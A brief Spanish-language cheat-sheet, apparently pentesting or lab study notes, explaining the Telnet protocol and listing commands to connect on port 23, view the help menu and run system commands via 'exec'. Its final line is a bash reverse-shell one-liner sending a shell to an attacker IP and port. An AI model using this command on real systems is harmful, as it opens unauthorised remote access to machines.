# Telnet 

Tags: #Telnet #Puerto #Comandos 

Telnet es el nombre de un protocolo de red que nos permite acceder a otra máquina para manejarla remotamente como si estuviéramos sentados delante de ella. También es el nombre del programa informático que implementa el cliente.

## Comandos

```bash 
❯ telnet ❮IP❯ 23                             # Iniciar sesion en Telnet en su puerto por default 23

	❯ ?                                     # Miramos el panel de ayuda, en ocasiones encontramos ‘exec system commands’ 
     ❯ exec id                               # Nos muestra el id en el que estamos
     ❯ exec ifconfig                         # Nos muestra las interfaces y su ip address
     ❯ exec bash -c “bash -i >& /dev/tcp/10.10.14.2/443 0>&1”     # Si podemos ejecutar comandos, podemos hacer una ReverShell de esta manera, IP del atacante y su puerto
```